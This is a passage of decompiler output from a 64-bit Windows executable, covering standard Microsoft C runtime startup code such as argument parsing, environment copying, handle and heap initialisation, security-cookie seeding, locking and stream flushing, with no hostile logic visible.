        uVar7 = (ulonglong)((int)uVar7 + 1);
        bVar4 = *pbVar9;
      }
      pbVar8 = pbVar9;
      if (*pbVar9 == 0x22) {
        if (((uVar7 & 1) == 0) && ((!bVar2 || (pbVar8 = pbVar9 + 1, pbVar9[1] != 0x22)))) {
          bVar1 = false;
          bVar2 = !bVar2;
          pbVar8 = pbVar9;
        }
        uVar7 = uVar7 >> 1;
      }
      uVar6 = (uint)uVar7;
      while (uVar6 != 0) {
        uVar6 = (int)uVar7 - 1;
        uVar7 = (ulonglong)uVar6;
        if (param_3 != (byte *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      bVar4 = *pbVar8;
      if ((bVar4 == 0) || ((!bVar2 && ((bVar4 == 0x20 || (bVar4 == 9)))))) break;
      if (bVar1) {
        bVar4 = FUN_1400136c0((int)(char)bVar4);
        iVar5 = (int)CONCAT71(extraout_var_00,bVar4);
        if (param_3 == (byte *)0x0) {
          if (iVar5 != 0) {
            pbVar8 = pbVar8 + 1;
            *param_5 = *param_5 + 1;
          }
          *param_5 = *param_5 + 1;
          goto LAB_14000ec8f;
        }
        pbVar9 = param_3;
        if (iVar5 != 0) {
          bVar4 = *pbVar8;
          pbVar9 = param_3 + 1;
          pbVar8 = pbVar8 + 1;
          *param_3 = bVar4;
          *param_5 = *param_5 + 1;
        }
        param_3 = pbVar9 + 1;
        *pbVar9 = *pbVar8;
        *param_5 = *param_5 + 1;
        pbVar8 = pbVar8 + 1;
      }
      else {
LAB_14000ec8f:
        pbVar8 = pbVar8 + 1;
      }
    }
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (param_2 != (undefined8 *)0x0) {
    *param_2 = 0;
  }
  *param_4 = *param_4 + 1;
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_14000ece0(void)

{
  ulonglong uVar1;
  undefined8 *puVar2;
  byte *pbVar3;
  ulonglong uVar4;
  int local_res8 [2];
  int local_res10 [2];
  
  if (DAT_14001c6f8 == 0) {
    FUN_14000ab10();
  }
  DAT_14001c0d4 = 0;
  GetModuleFileNameA((HMODULE)0x0,&DAT_14001bfd0,0x104);
  _DAT_14001bc98 = &DAT_14001bfd0;
  if ((DAT_14001d728 == (byte *)0x0) || (pbVar3 = DAT_14001d728, *DAT_14001d728 == 0)) {
    pbVar3 = &DAT_14001bfd0;
  }
  FUN_14000eac0(pbVar3,(undefined8 *)0x0,(byte *)0x0,local_res8,local_res10);
  uVar4 = (ulonglong)local_res8[0];
  if (((uVar4 < 0x1fffffffffffffff) &&
      (uVar1 = (ulonglong)local_res10[0], uVar1 != 0xffffffffffffffff)) &&
     (uVar1 <= uVar1 + uVar4 * 8)) {
    puVar2 = (undefined8 *)FUN_14000f600();
    if (puVar2 != (undefined8 *)0x0) {
      FUN_14000eac0(pbVar3,puVar2,(byte *)(puVar2 + uVar4),local_res8,local_res10);
      _DAT_14001bc68 = puVar2;
      _DAT_14001bc60 = local_res8[0] + -1;
      return 0;
    }
  }
  return 0xffffffff;
}




LPSTR FUN_14000edf0(void)

{
  char cVar1;
  WCHAR WVar2;
  DWORD DVar3;
  int cbMultiByte;
  int iVar4;
  LPWCH lpWideCharStr;
  LPSTR pCVar5;
  LPCH _Src;
  char *pcVar6;
  WCHAR *pWVar8;
  size_t _Size;
  char *pcVar7;
  WCHAR *pWVar9;
  
  if (DAT_14001c0d8 == 0) {
    lpWideCharStr = GetEnvironmentStringsW();
    if (lpWideCharStr != (LPWCH)0x0) {
      DAT_14001c0d8 = 1;
      goto LAB_14000ee5e;
    }
    DVar3 = GetLastError();
    if (DVar3 == 0x78) {
      DAT_14001c0d8 = 2;
      goto LAB_14000ef39;
    }
  }
  if (DAT_14001c0d8 != 1) {
    if ((DAT_14001c0d8 != 2) && (DAT_14001c0d8 != 0)) {
      return (LPSTR)0x0;
    }
LAB_14000ef39:
    _Src = GetEnvironmentStrings();
    if (_Src != (LPCH)0x0) {
      cVar1 = *_Src;
      pcVar6 = _Src;
      while (cVar1 != '\0') {
        do {
          pcVar7 = pcVar6;
          pcVar6 = pcVar7 + 1;
        } while (*pcVar6 != '\0');
        pcVar6 = pcVar7 + 2;
        cVar1 = *pcVar6;
      }
      _Size = (size_t)(((int)pcVar6 - (int)_Src) + 1);
      pCVar5 = (LPSTR)FUN_14000f600(_Size);
      if (pCVar5 != (LPSTR)0x0) {
        memcpy(pCVar5,_Src,_Size);
        FreeEnvironmentStringsA(_Src);
        return pCVar5;
      }
      FreeEnvironmentStringsA(_Src);
    }
    return (LPSTR)0x0;
  }
  lpWideCharStr = GetEnvironmentStringsW();
  if (lpWideCharStr == (LPWCH)0x0) {
    return (LPSTR)0x0;
  }
LAB_14000ee5e:
  WVar2 = *lpWideCharStr;
  pWVar8 = lpWideCharStr;
  while (WVar2 != L'\0') {
    do {
      pWVar9 = pWVar8;
      pWVar8 = pWVar9 + 1;
    } while (*pWVar8 != L'\0');
    pWVar8 = pWVar9 + 2;
    WVar2 = *pWVar8;
  }
  iVar4 = (int)((longlong)pWVar8 - (longlong)lpWideCharStr >> 1);
  cbMultiByte = WideCharToMultiByte(0,0,lpWideCharStr,iVar4 + 1,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0
                                   );
  if ((cbMultiByte == 0) ||
     (pCVar5 = (LPSTR)FUN_14000f600((longlong)cbMultiByte), pCVar5 == (LPSTR)0x0)) {
    FreeEnvironmentStringsW(lpWideCharStr);
    pCVar5 = (LPSTR)0x0;
  }
  else {
    iVar4 = WideCharToMultiByte(0,0,lpWideCharStr,iVar4 + 1,pCVar5,cbMultiByte,(LPCSTR)0x0,
                                (LPBOOL)0x0);
    if (iVar4 == 0) {
      FUN_14000b9c0(pCVar5);
      pCVar5 = (LPSTR)0x0;
    }
    FreeEnvironmentStringsW(lpWideCharStr);
  }
  return pCVar5;
}




undefined8 FUN_14000efc0(void)

{
  DWORD DVar1;
  undefined8 *puVar2;
  undefined8 uVar3;
  ulonglong uVar4;
  HANDLE pvVar5;
  uint uVar6;
  longlong lVar7;
  longlong *plVar8;
  ulonglong uVar9;
  byte *pbVar10;
  ulonglong uVar11;
  UINT *pUVar12;
  UINT UVar13;
  UINT UVar14;
  _STARTUPINFOA local_88;
  
  GetStartupInfoA(&local_88);
  puVar2 = (undefined8 *)FUN_14000f670(0x20);
  if (puVar2 == (undefined8 *)0x0) {
    uVar3 = 0xffffffff;
  }
  else {
    DAT_14001c4cc = 0x20;
    DAT_14001c4e0 = puVar2;
    if (puVar2 < puVar2 + 0x140) {
      do {
        *(undefined1 *)(puVar2 + 1) = 0;
        *puVar2 = 0xffffffffffffffff;
        *(undefined1 *)((longlong)puVar2 + 9) = 10;
        *(undefined4 *)((longlong)puVar2 + 0xc) = 0;
        *(undefined1 *)(puVar2 + 7) = 0;
        *(undefined1 *)((longlong)puVar2 + 0x39) = 10;
        *(undefined1 *)((longlong)puVar2 + 0x3a) = 10;
        puVar2 = puVar2 + 10;
      } while (puVar2 < DAT_14001c4e0 + 0x140);
    }
    uVar9 = 0;
    uVar11 = uVar9;
    if ((local_88.cbReserved2 != 0) && ((UINT *)local_88.lpReserved2 != (UINT *)0x0)) {
      UVar14 = *(UINT *)local_88.lpReserved2;
      pUVar12 = (UINT *)((longlong)local_88.lpReserved2 + 4);
      pbVar10 = (byte *)((longlong)pUVar12 + (longlong)(int)UVar14);
      UVar13 = 0x800;
      if ((int)UVar14 < 0x800) {
        UVar13 = UVar14;
      }
      lVar7 = 1;
      while ((UVar14 = UVar13, (int)DAT_14001c4cc < (int)UVar13 &&
             (puVar2 = (undefined8 *)FUN_14000f670(0x20), UVar14 = DAT_14001c4cc,
             puVar2 != (undefined8 *)0x0))) {
        (&DAT_14001c4e0)[lVar7] = puVar2;
        DAT_14001c4cc = DAT_14001c4cc + 0x20;
        if (puVar2 < puVar2 + 0x140) {
          do {
            *(undefined1 *)(puVar2 + 1) = 0;
            *puVar2 = 0xffffffffffffffff;
            *(undefined1 *)((longlong)puVar2 + 9) = 10;
            *(undefined4 *)((longlong)puVar2 + 0xc) = 0;
            *(byte *)(puVar2 + 7) = *(byte *)(puVar2 + 7) & 0x80;
            *(undefined1 *)((longlong)puVar2 + 0x39) = 10;
            *(undefined1 *)((longlong)puVar2 + 0x3a) = 10;
            puVar2 = puVar2 + 10;
          } while (puVar2 < (undefined8 *)((longlong)(&DAT_14001c4e0)[lVar7] + 0xa00));
        }
        lVar7 = lVar7 + 1;
      }
      uVar4 = uVar9;
      if (0 < (int)UVar14) {
        do {
          pvVar5 = *(HANDLE *)pbVar10;
          uVar6 = (uint)uVar4;
          if ((((pvVar5 != (HANDLE)0xffffffffffffffff) && (pvVar5 != (HANDLE)0xfffffffffffffffe)) &&
              ((*pUVar12 & 1) != 0)) &&
             (((*pUVar12 & 8) != 0 || (DVar1 = GetFileType(pvVar5), DVar1 != 0)))) {
            puVar2 = (undefined8 *)
                     ((ulonglong)(uVar6 & 0x1f) * 0x50 +
                     (longlong)(&DAT_14001c4e0)[(longlong)(int)uVar6 >> 5]);
            *puVar2 = *(undefined8 *)pbVar10;
            *(byte *)(puVar2 + 1) = (byte)*pUVar12;
            uVar4 = FUN_1400132e0(puVar2 + 2,4000);
            if ((int)uVar4 == 0) {
              return 0xffffffff;
            }
            *(int *)((longlong)puVar2 + 0xc) = *(int *)((longlong)puVar2 + 0xc) + 1;
          }
          uVar4 = (ulonglong)(uVar6 + 1);
          pUVar12 = (UINT *)((longlong)pUVar12 + 1);
          pbVar10 = pbVar10 + 8;
        } while ((int)(uVar6 + 1) < (int)UVar14);
      }
    }
    do {
      plVar8 = DAT_14001c4e0 + uVar9 * 10;
      if ((*plVar8 == -1) || (*plVar8 == -2)) {
        *(undefined1 *)(plVar8 + 1) = 0x81;
        if (uVar9 == 0) {
          DVar1 = 0xfffffff6;
        }
        else {
          DVar1 = ((int)uVar11 == 1) - 0xc;
        }
        pvVar5 = GetStdHandle(DVar1);
        if (((pvVar5 == (HANDLE)0xffffffffffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar1 = GetFileType(pvVar5), DVar1 == 0)) {
          *(byte *)(plVar8 + 1) = *(byte *)(plVar8 + 1) | 0x40;
          *plVar8 = -2;
        }
        else {
          *plVar8 = (longlong)pvVar5;
          if ((DVar1 & 0xff) == 2) {
            *(byte *)(plVar8 + 1) = *(byte *)(plVar8 + 1) | 0x40;
          }
          else if ((DVar1 & 0xff) == 3) {
            *(byte *)(plVar8 + 1) = *(byte *)(plVar8 + 1) | 8;
          }
          uVar4 = FUN_1400132e0(plVar8 + 2,4000);
          if ((int)uVar4 == 0) {
            return 0xffffffff;
          }
          *(int *)((longlong)plVar8 + 0xc) = *(int *)((longlong)plVar8 + 0xc) + 1;
        }
      }
      else {
        *(byte *)(plVar8 + 1) = *(byte *)(plVar8 + 1) | 0x80;
      }
      uVar9 = uVar9 + 1;
      uVar11 = (ulonglong)((int)uVar11 + 1);
    } while ((longlong)uVar9 < 3);
    SetHandleCount(DAT_14001c4cc);
    uVar3 = 0;
  }
  return uVar3;
}




/* WARNING: Removing unreachable block (ram,0x00014000f310) */
/* WARNING: Removing unreachable block (ram,0x00014000f318) */
/* WARNING: Removing unreachable block (ram,0x00014000f31a) */

void FUN_14000f2f0(void)

{
  return;
}




/* Library Function - Single Match
    _heap_init
   
   Library: Visual Studio 2005 Release */

int __cdecl _heap_init(void)

{
  undefined4 local_res8 [8];
  
  DAT_14001c0e0 = HeapCreate(0,0x1000,0);
  if (DAT_14001c0e0 == (HANDLE)0x0) {
    return 0;
  }
  local_res8[0] = 2;
  HeapSetInformation(DAT_14001c0e0,HeapCompatibilityInformation,local_res8,4);
  return 1;
}




void FUN_14000f3d0(void)

{
  _FILETIME _Var1;
  DWORD DVar2;
  DWORD DVar3;
  DWORD DVar4;
  _FILETIME local_res8;
  LARGE_INTEGER local_res10;
  
  local_res8.dwLowDateTime = 0;
  local_res8.dwHighDateTime = 0;
  if (DAT_14001a0b0 != 0x2b992ddfa232) {
    DAT_14001a0b8 = ~DAT_14001a0b0;
    return;
  }
  GetSystemTimeAsFileTime(&local_res8);
  _Var1 = local_res8;
  DVar2 = GetCurrentProcessId();
  DVar3 = GetCurrentThreadId();
  DVar4 = GetTickCount();
  QueryPerformanceCounter(&local_res10);
  DAT_14001a0b0 =
       (local_res10.QuadPart ^
       (ulonglong)_Var1 ^ (ulonglong)DVar2 ^ (ulonglong)DVar3 ^ (ulonglong)DVar4) & 0xffffffffffff;
  if (DAT_14001a0b0 == 0x2b992ddfa232) {
    DAT_14001a0b0 = 0x2b992ddfa233;
  }
  DAT_14001a0b8 = ~DAT_14001a0b0;
  return;
}




void FUN_14000f4d0(void)

{
  return;
}




void FUN_14000f500(void)

{
  return;
}




/* Library Function - Single Match
    _ValidateImageBase
   
   Library: Visual Studio 2005 Release */

BOOL __cdecl _ValidateImageBase(PBYTE pImageBase)

{
  uint uVar1;
  
  uVar1 = 0;
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    uVar1 = (uint)(*(short *)(pImageBase + (longlong)*(int *)(pImageBase + 0x3c) + 0x18) == 0x20b);
  }
  return uVar1;
}




/* Library Function - Single Match
    _FindPESection
   
   Library: Visual Studio 2005 Release */

PIMAGE_SECTION_HEADER __cdecl _FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase +
           (ulonglong)*(ushort *)(pImageBase + (longlong)iVar1 + 0x14) + 0x18 + (longlong)iVar1);
  if (*(ushort *)(pImageBase + (longlong)iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + (longlong)iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}




/* Library Function - Single Match
    _IsNonwritableInCurrentImage
   
   Library: Visual Studio 2005 Release */

BOOL __cdecl _IsNonwritableInCurrentImage(PBYTE pTarget)

{
  uint uVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  IMAGE_DOS_HEADER *pImageBase;
  
  pImageBase = &IMAGE_DOS_HEADER_140000000;
  uVar1 = _ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_140000000);
  p_Var2 = (PIMAGE_SECTION_HEADER)(ulonglong)uVar1;
  if (uVar1 != 0) {
    p_Var2 = _FindPESection((PBYTE)pImageBase,(longlong)pTarget - (longlong)pImageBase);
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      p_Var2 = (PIMAGE_SECTION_HEADER)(ulonglong)(~(p_Var2->Characteristics >> 0x1f) & 1);
    }
  }
  return (BOOL)p_Var2;
}




bool FUN_14000f5d0(undefined8 *param_1)

{
  return *(int *)*param_1 == -0x3ffffffb;
}




LPVOID FUN_14000f600(size_t param_1)

{
  LPVOID pvVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = FUN_14000dc10(param_1);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (DAT_14001c0e8 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_14001c0e8 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (LPVOID)0x0;
    }
  }
  return (LPVOID)0x0;
}




LPVOID FUN_14000f670(ulonglong param_1,ulonglong param_2)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = FUN_140013780(param_1,param_2,(undefined4 *)0x0);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (DAT_14001c0e8 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_14001c0e8 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (LPVOID)0x0;
    }
  }
  return (LPVOID)0x0;
}




LPVOID FUN_14000f700(LPVOID param_1,size_t param_2)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = FUN_140013850(param_1,param_2);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (param_2 == 0) {
      return (LPVOID)0x0;
    }
    if (DAT_14001c0e8 == 0) {
      return (LPVOID)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_14001c0e8 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (LPVOID)0x0;
}




int FUN_14000f790(void)

{
  FILE *pFVar1;
  int iVar2;
  int iVar3;
  longlong lVar4;
  int iVar5;
  
  iVar5 = 0;
  _lock(1);
  for (iVar3 = 3; iVar3 < DAT_14001d720; iVar3 = iVar3 + 1) {
    lVar4 = (longlong)iVar3;
    if (*(longlong *)(DAT_14001c718 + lVar4 * 8) != 0) {
      pFVar1 = *(FILE **)(DAT_14001c718 + lVar4 * 8);
      if ((pFVar1->_flag & 0x83) != 0) {
        iVar2 = FUN_1400139e0(pFVar1);
        if (iVar2 != -1) {
          iVar5 = iVar5 + 1;
        }
      }
      if (0x13 < iVar3) {
        DeleteCriticalSection((LPCRITICAL_SECTION)(*(longlong *)(DAT_14001c718 + lVar4 * 8) + 0x30))
        ;
        FUN_14000b9c0(*(LPVOID *)(DAT_14001c718 + lVar4 * 8));
        *(undefined8 *)(DAT_14001c718 + lVar4 * 8) = 0;
      }
    }
  }
  FUN_14000fc60(1);
  return iVar5;
}




void FUN_14000f860(void)

{
  FUN_14000fc60(1);
  return;
}




undefined8 FUN_14000f880(int *param_1)

{
  uint uVar1;
  undefined8 uVar2;
  uint uVar3;
  
  uVar2 = 0;
  if (((((byte)param_1[6] & 3) == 2) && ((param_1[6] & 0x108U) != 0)) &&
     (uVar3 = *param_1 - param_1[4], 0 < (int)uVar3)) {
    uVar1 = FUN_14000fe60((longlong)param_1);
    uVar1 = FUN_140011e90(uVar1,*(WCHAR **)(param_1 + 4),uVar3);
    if (uVar1 == uVar3) {
      if ((char)param_1[6] < '\0') {
        param_1[6] = param_1[6] & 0xfffffffd;
      }
    }
    else {
      param_1[6] = param_1[6] | 0x20;
      uVar2 = 0xffffffff;
    }
  }
  param_1[2] = 0;
  *(undefined8 *)param_1 = *(undefined8 *)(param_1 + 4);
  return uVar2;
}




ulonglong FUN_14000f900(int *param_1)

{
  int iVar1;
  uint uVar2;
  DWORD DVar3;
  undefined4 extraout_var;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
    iVar1 = FUN_14000f9c0(0);
    return CONCAT44(extraout_var,iVar1);
  }
  iVar1 = 0;
  if (((((byte)param_1[6] & 3) == 2) && (iVar1 = 0, (param_1[6] & 0x108U) != 0)) &&
     (uVar4 = *param_1 - param_1[4], 0 < (int)uVar4)) {
    uVar2 = FUN_14000fe60((longlong)param_1);
    uVar2 = FUN_140011e90(uVar2,*(WCHAR **)(param_1 + 4),uVar4);
    if (uVar2 == uVar4) {
      iVar1 = 0;
      if ((char)param_1[6] < '\0') {
        param_1[6] = param_1[6] & 0xfffffffd;
      }
    }
    else {
      param_1[6] = param_1[6] | 0x20;
      iVar1 = -1;
    }
  }
  *(undefined8 *)param_1 = *(undefined8 *)(param_1 + 4);
  param_1[2] = 0;
  if (iVar1 == 0) {
    if (((uint)param_1[6] >> 0xe & 1) == 0) {
      return 0;
    }
    uVar4 = FUN_14000fe60((longlong)param_1);
    DVar3 = FUN_140013a80(uVar4);
    return (ulonglong)-(uint)(DVar3 != 0);
  }
  return 0xffffffff;
}




int FUN_14000f9c0(int param_1)

{
  longlong lVar1;
  int *piVar2;
  ulonglong uVar3;
  int iVar4;
  longlong lVar5;
  int iVar6;
  int iVar7;
  
  iVar6 = 0;
  iVar7 = 0;
  _lock(1);
  for (iVar4 = 0; iVar4 < DAT_14001d720; iVar4 = iVar4 + 1) {
    lVar5 = (longlong)iVar4;
    if ((*(longlong *)(DAT_14001c718 + lVar5 * 8) != 0) &&
       (lVar1 = *(longlong *)(DAT_14001c718 + lVar5 * 8), (*(byte *)(lVar1 + 0x18) & 0x83) != 0)) {
      FUN_140008a00(iVar4,lVar1);
      piVar2 = *(int **)(DAT_14001c718 + lVar5 * 8);
      if ((piVar2[6] & 0x83U) != 0) {
        if (param_1 == 1) {
          uVar3 = FUN_14000f900(piVar2);
          if ((int)uVar3 != -1) {
            iVar6 = iVar6 + 1;
          }
        }
        else if ((param_1 == 0) && ((piVar2[6] & 2U) != 0)) {
          uVar3 = FUN_14000f900(piVar2);
          if ((int)uVar3 == -1) {
            iVar7 = -1;
          }
        }
      }
      FUN_140008a90(iVar4,*(longlong *)(DAT_14001c718 + lVar5 * 8));
    }
  }
  FUN_14000fc60(1);
  if (param_1 == 1) {
    iVar7 = iVar6;
  }
  return iVar7;
}




void FUN_14000fac0(undefined8 param_1,longlong param_2)

{
  FUN_140008a90(*(int *)(param_2 + 0x20),
                *(longlong *)(DAT_14001c718 + (longlong)*(int *)(param_2 + 0x20) * 8));
  return;
}




void FUN_14000faf0(void)

{
  FUN_14000fc60(1);
  return;
}




void FUN_14000fb10(void)

{
  FUN_14000f9c0(1);
  return;
}




undefined8 FUN_14000fb20(void)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined8 *puVar3;
  int iVar4;
  int iVar5;
  
  iVar4 = 0;
  iVar5 = 0;
  puVar3 = &DAT_14001aff0;
  do {
    if (*(int *)(puVar3 + 1) == 1) {
      lVar1 = (longlong)iVar4;
      iVar4 = iVar4 + 1;
      *puVar3 = &DAT_14001c0f0 + lVar1 * 0x28;
      uVar2 = FUN_1400132e0(&DAT_14001c0f0 + lVar1 * 0x28,4000);
      if ((int)uVar2 == 0) {
        (&DAT_14001aff0)[(longlong)iVar5 * 2] = 0;
        return 0;
      }
    }
    puVar3 = puVar3 + 2;
    iVar5 = iVar5 + 1;
  } while ((longlong)puVar3 < 0x14001b230);
  return 1;
}




void FUN_14000fbc0(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = &DAT_14001aff0;
  puVar2 = &DAT_14001aff0;
  do {
    lpCriticalSection = (LPCRITICAL_SECTION)*puVar2;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (*(int *)(puVar2 + 1) != 1)) {
      DeleteCriticalSection(lpCriticalSection);
      FUN_14000b9c0(lpCriticalSection);
      *puVar2 = 0;
    }
    puVar2 = puVar2 + 2;
  } while ((longlong)puVar2 < 0x14001b230);
  do {
    if (((LPCRITICAL_SECTION)*puVar1 != (LPCRITICAL_SECTION)0x0) && (*(int *)(puVar1 + 1) == 1)) {
      DeleteCriticalSection((LPCRITICAL_SECTION)*puVar1);
    }
    puVar1 = puVar1 + 2;
  } while ((longlong)puVar1 < 0x14001b230);
  return;
}




void FUN_14000fc60(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x00014000fc71. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_14001aff0)[(longlong)param_1 * 2]);
  return;
}




undefined8 FUN_14000fc80(int param_1)

{
  LPVOID pvVar1;
  DWORD *pDVar2;
  ulonglong uVar3;
  longlong lVar4;
  undefined8 uVar5;
  
  lVar4 = (longlong)param_1;
  uVar5 = 1;
  if (DAT_14001c0e0 == 0) {
    FUN_14000e5b0();
    FUN_14000e370(0x1e);
    FUN_14000df70(0xff);
  }
  if ((&DAT_14001aff0)[lVar4 * 2] == 0) {
    pvVar1 = (LPVOID)FUN_14000f600(0x28);
    if (pvVar1 == (LPVOID)0x0) {
      pDVar2 = FUN_140009c00();
      *pDVar2 = 0xc;
      uVar5 = 0;
    }
    else {
      _lock(10);
      if ((&DAT_14001aff0)[lVar4 * 2] == 0) {
        uVar3 = FUN_1400132e0(pvVar1,4000);
        if ((int)uVar3 == 0) {
          FUN_14000b9c0(pvVar1);
          pDVar2 = FUN_140009c00();
          *pDVar2 = 0xc;
          uVar5 = 0;
        }
        else {
          (&DAT_14001aff0)[lVar4 * 2] = pvVar1;
        }
      }
      else {
        FUN_14000b9c0(pvVar1);
      }
      LeaveCriticalSection(DAT_14001b090);
    }
  }
  else {
    uVar5 = 1;
  }
  return uVar5;
}




void FUN_14000fd70(void)

{
  LeaveCriticalSection(DAT_14001b090);
  return;
}




/* Library Function - Single Match
    _lock
   
   Library: Visual Studio 2008 Release */

void __cdecl _lock(int _File)

{
  undefined8 uVar1;
  
  if ((&DAT_14001aff0)[(longlong)_File * 2] == 0) {
    uVar1 = FUN_14000fc80(_File);
    if ((int)uVar1 == 0) {
      _amsg_exit(0x11);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x00014000fdcd. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_14001aff0)[(longlong)_File * 2]);
  return;
}




byte FUN_14000fde0(uint param_1)

{
  DWORD *pDVar1;
  
  if (param_1 == 0xfffffffe) {
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    return 0;
  }
  if ((-1 < (int)param_1) && (param_1 < DAT_14001c4cc)) {
    return *(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                    (ulonglong)(param_1 & 0x1f) * 0x50) & 0x40;
  }
  pDVar1 = FUN_140009c00();
  *pDVar1 = 9;
  FUN_1400072d0(0,0,0,0,0);
  return 0;
}




undefined4 FUN_14000fe60(longlong param_1)

{
  DWORD *pDVar1;
  
  if (param_1 == 0) {
    pDVar1 = FUN_140009c00();
    *pDVar1 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    return 0xffffffff;
  }
  return *(undefined4 *)(param_1 + 0x1c);
}




void FUN_14000fea0(void)

{
  undefined *puVar1;
  undefined **ppuVar2;
  longlong lVar3;
  
  lVar3 = 10;
  ppuVar2 = &PTR_LAB_14001b230;
  do {
    puVar1 = (undefined *)FUN_14000af20((INT_PTR)*ppuVar2);
    lVar3 = lVar3 + -1;
    *ppuVar2 = puVar1;
    ppuVar2 = ppuVar2 + 1;
  } while (lVar3 != 0);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

DWORD FUN_14000fee0(int *param_1,ulonglong *param_2,ulonglong param_3,WCHAR param_4,
                   undefined8 *param_5)

{
  undefined *puVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  DWORD *pDVar5;
  pthreadlocinfo ptVar6;
  BOOL local_res10 [2];
  WCHAR local_res20 [4];
  DWORD *local_38;
  
  if ((param_2 == (ulonglong *)0x0) && (param_3 != 0)) {
    if (param_1 != (int *)0x0) {
      *param_1 = 0;
    }
    return 0;
  }
  if (param_1 != (int *)0x0) {
    *param_1 = -1;
  }
  local_res20[0] = param_4;
  if (0x7fffffff < param_3) {
    pDVar5 = FUN_140009c00();
    *pDVar5 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    return 0x16;
  }
  bVar2 = false;
  if (param_5 == (undefined8 *)0x0) {
    local_38 = FUN_14000b3d0();
    ptVar6 = *(pthreadlocinfo *)(local_38 + 0x30);
    puVar1 = *(undefined **)(local_38 + 0x2e);
    if ((ptVar6 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & local_38[0x32]) == 0)) {
      ptVar6 = __updatetlocinfo();
    }
    if ((puVar1 != PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_38[0x32]) == 0)) {
      __updatetmbcinfo();
    }
    if ((local_38[0x32] & 2) == 0) {
      bVar2 = true;
      local_38[0x32] = local_38[0x32] | 2;
    }
  }
  else {
    ptVar6 = (pthreadlocinfo)*param_5;
    bVar2 = false;
  }
  if (*(int *)((longlong)&ptVar6->lc_category[0].locale + 4) == 0) {
    if ((ushort)local_res20[0] < 0x100) {
      if (param_2 != (ulonglong *)0x0) {
        if (param_3 == 0) {
          pDVar5 = FUN_140009c00();
          *pDVar5 = 0x22;
          goto LAB_14001012a;
        }
        *(char *)param_2 = (char)local_res20[0];
      }
      if (param_1 != (int *)0x0) {
        *param_1 = 1;
      }
LAB_1400100ed:
      if (bVar2) {
        local_38[0x32] = local_38[0x32] & 0xfffffffd;
      }
      return 0;
    }
    if ((param_2 != (ulonglong *)0x0) && (param_3 != 0)) {
      FUN_140006070(param_2,0,param_3);
    }
    pDVar5 = FUN_140009c00();
    *pDVar5 = 0x2a;
    pDVar5 = FUN_140009c00();
    DVar4 = *pDVar5;
  }
  else {
    local_res10[0] = 0;
    iVar3 = WideCharToMultiByte(ptVar6->lc_codepage,0,local_res20,1,(LPSTR)param_2,(int)param_3,
                                (LPCSTR)0x0,local_res10);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x7a) {
        if ((param_2 != (ulonglong *)0x0) && (param_3 != 0)) {
          FUN_140006070(param_2,0,param_3);
        }
        pDVar5 = FUN_140009c00();
        *pDVar5 = 0x22;
LAB_14001012a:
        FUN_1400072d0(0,0,0,0,0);
        if (bVar2) {
